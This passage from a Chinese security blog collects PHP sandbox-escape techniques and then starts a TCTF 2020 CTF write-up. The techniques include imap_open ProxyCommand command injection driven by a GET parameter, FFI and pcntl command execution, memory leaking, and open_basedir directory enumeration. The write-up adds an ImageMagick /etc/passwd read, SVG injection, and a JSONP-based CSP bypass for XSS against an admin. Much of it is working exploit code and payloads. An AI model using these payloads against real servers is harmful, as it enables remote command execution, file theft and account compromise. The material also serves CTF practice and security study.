<h3 id="利用脚本-未测试"><a href="#利用脚本-未测试" class="headerlink" title="利用脚本(未测试)"></a>利用脚本(未测试)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echo\t&quot;</span> . base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64\t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] . &quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;;</span></span><br><span class="line">imap_open(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>); <span class="comment">// or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="利用pcntl插件绕过"><a href="#利用pcntl插件绕过" class="headerlink" title="利用pcntl插件绕过"></a>利用pcntl插件绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</span><br></pre></td></tr></table></figure>



<h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>FFI::load 无视 opeb_basedir 可以直接加载文件</p>
<p>FFI 相对于 php 更加底层，可以泄露内存</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;sleep 5&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="open-basedir，禁用FFI-cdef，目录无法写文件命令执行"><a href="#open-basedir，禁用FFI-cdef，目录无法写文件命令执行" class="headerlink" title="open_basedir，禁用FFI::cdef，目录无法写文件命令执行"></a>open_basedir，禁用FFI::cdef，目录无法写文件命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$value=&lt;&lt;&lt;EOF</span><br><span class="line">#define FFI_SCOPE &quot;DUMMY&quot;</span><br><span class="line">#define FFI_LIB &quot;libc.so.6&quot;</span><br><span class="line"> </span><br><span class="line">int system(const char *command);</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$tmpHandle = tmpfile();</span><br><span class="line">$metaDatas = stream_get_meta_data($tmpHandle);</span><br><span class="line">$tmpFilename = $metaDatas[&#x27;uri&#x27;];</span><br><span class="line">fwrite($tmpHandle, $value);</span><br><span class="line">fseek($tmpHandle, 0);</span><br><span class="line">echo fread($tmpHandle, 1024);</span><br><span class="line">var_dump($tmpFilename);</span><br><span class="line">fflush($tmpHandle );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ffi=FFI::load($tmpFilename);</span><br><span class="line">$ffi-&gt;system(&#x27;echo bypass_disable_function &gt; /tmp/testing&#x27;);</span><br><span class="line"></span><br><span class="line">fclose($tmpHandle);</span><br></pre></td></tr></table></figure>



<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=FFI::load(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=FFI::cast(<span class="string">&quot;void *&quot;</span>,FFI::new(<span class="string">&quot;int[1]&quot;</span>,<span class="literal">false</span>));</span><br><span class="line"><span class="variable">$a</span>=FFI::string(<span class="variable">$b</span>-<span class="number">400000</span>,<span class="number">400000</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
<h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p>
<h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p>
<h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">&quot;win32std&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;win32std extension required!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745#h3-5">https://www.anquanke.com/post/id/197745#h3-5</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95">浅谈几种Bypass-disable-functions的方法</a> </p>
<h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfile绕过open-basedir在-tmp目录写文件"><a href="#tmpfile绕过open-basedir在-tmp目录写文件" class="headerlink" title="tmpfile绕过open_basedir在/tmp目录写文件"></a>tmpfile绕过open_basedir在/tmp目录写文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$value=&lt;&lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">$tmpHandle = tmpfile();</span><br><span class="line">$metaDatas = stream_get_meta_data($tmpHandle);</span><br><span class="line">$tmpFilename = $metaDatas[&#x27;uri&#x27;];</span><br><span class="line">fwrite($tmpHandle, $value);</span><br><span class="line">fseek($tmpHandle, 0);</span><br><span class="line">echo fread($tmpHandle, 1024);</span><br><span class="line">var_dump($tmpFilename);</span><br><span class="line">fflush($tmpHandle );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fclose($tmpHandle);</span><br></pre></td></tr></table></figure>







<h2 id="ini-set与chdir-绕过open-basedir"><a href="#ini-set与chdir-绕过open-basedir" class="headerlink" title="ini_set与chdir 绕过open_basedir"></a>ini_set与chdir 绕过open_basedir</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="glob协议列根目录"><a href="#glob协议列根目录" class="headerlink" title="glob协议列根目录"></a>glob协议列根目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h2><p>realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了<code>open_basedir</code>的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在<code>open_basedir</code>里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，所以这个时候就可以类似于报错盲注去爆出文件名了<br>这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexist&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span>.<span class="variable">$chars</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;&lt;&#x27;</span>;</span><br><span class="line">    realpath(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexist</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$regex</span> = <span class="string">&#x27;/File\((.*)\) is not within/&#x27;</span>;</span><br><span class="line">    printf(<span class="string">&quot;errstr: %s &lt;br/&gt;&quot;</span>,<span class="variable">$errstr</span>);</span><br><span class="line">    preg_match(<span class="variable">$regex</span>, <span class="variable">$errstr</span>, <span class="variable">$mathes</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$mathes</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        printf(<span class="string">&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;</span>, <span class="variable">$mathes</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SplFileInfo-getRealPath列目录"><a href="#SplFileInfo-getRealPath列目录" class="headerlink" title="SplFileInfo::getRealPath列目录"></a>SplFileInfo::getRealPath列目录</h2><p> SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的<code>realpath</code>很相似，就是<code>getRealPath</code>，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了<code>open_basedir</code>的设定 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$basedir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&lt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;getRealPath();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$re</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="GD库imageftbbox-imagefttext列举目录"><a href="#GD库imageftbbox-imagefttext列举目录" class="headerlink" title="GD库imageftbbox/imagefttext列举目录"></a>GD库imageftbbox/imagefttext列举目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span></span><br><span class="line">    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span></span><br><span class="line">    imageftbbox(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        printf(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="bindtextdomain暴力猜解目录"><a href="#bindtextdomain暴力猜解目录" class="headerlink" title="bindtextdomain暴力猜解目录"></a>bindtextdomain暴力猜解目录</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p>
<p> 如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。 </p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/06/29/bypass_disable_function_open_basedir/" data-id="cku8ky2xz003ednnf2wfzah5w" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/29/tctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/29/tctf2020/">tctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>好难.jpg</p>
<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>这题在我们一堆人的群殴下才做出来</p>
<p>题目主要的http请求是：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p>
<p>与</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/image/VMyeGe/xxx</span><br><span class="line">xxx是后缀，具体列表在：https://imagemagick.org/script/formats.php</span><br></pre></td></tr></table></figure>





<h3 id="第一部分-ImageMagick读取文件"><a href="#第一部分-ImageMagick读取文件" class="headerlink" title="第一部分 ImageMagick读取文件"></a>第一部分 ImageMagick读取文件</h3><p>测试share发现，无论我们输入的previewid时候存在，都会生成一个短链</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p>
<p>访问对应的png界面时: <a target="_blank" rel="noopener" href="http://pwnable.org:5000//image/ZpVQfl/png">http://pwnable.org:5000//image/ZpVQfl/png</a> </p>
<p>返回报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#x27;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>根据报错猜测是ImageMagick 来转换成对应的后缀</p>
<p>fuzz后缀后发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/image/FdrpgF/htm</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p>
<p>根据preview返回的数据，后端估计是先生成一个svg,再转化为其他的格式</p>
<p>我们再看看他们是如何传递并表示表情的</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p>
<p>发现</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p>
<p>修改[]里的值可以逃出引号的限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;&#125;]</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p>
<p>搜索<strong>ImageMagick convert ctf</strong> 发现，ImageMagick convert可以<a target="_blank" rel="noopener" href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/">读取文件</a></p>
<p>构造:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryHJ88AZN7</span><br><span class="line">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class="line"></span><br><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;&#125;]</span><br><span class="line">------WebKitFormBoundaryHJ88AZN7--</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p>
<p>测试常见的文件后找到源文件：app.py</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p>
<p>这里我们重点关注responseJSON和 secret这两个函数</p>
<h3 id="第二部分-xss管理员"><a href="#第二部分-xss管理员" class="headerlink" title="第二部分 xss管理员"></a>第二部分 xss管理员</h3><p>secret是让我们xss管理员，但是存在csp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img-src * data:; default-src &#x27;self&#x27;; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; connect-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;</span><br></pre></td></tr></table></figure>



<p>responseJSON可以让我们在json数据前加上xxx=,结合报错返回的数据是json格式，如果我们能控制报错信息，我们就能绕过csp</p>
<p>前文发现 ImageMagick 的那个接口(share)刚好可以控制报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">previewid=`test&quot;&#125;,alert(1),&#123;&quot;2&quot;:&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p>
<p>接着就是让htm包含它：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p>
<h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>一叶飘零大大的wp：</p>
<p> <a target="_blank" rel="noopener" href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_GET[&#x27;rh&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;rh&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单的源代码,首先查看phpinfo:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p>
<p>open_basedir: /var/www/html 且该目录不可写，twitter上那个绕过open_basedir的方法就没用了</p>
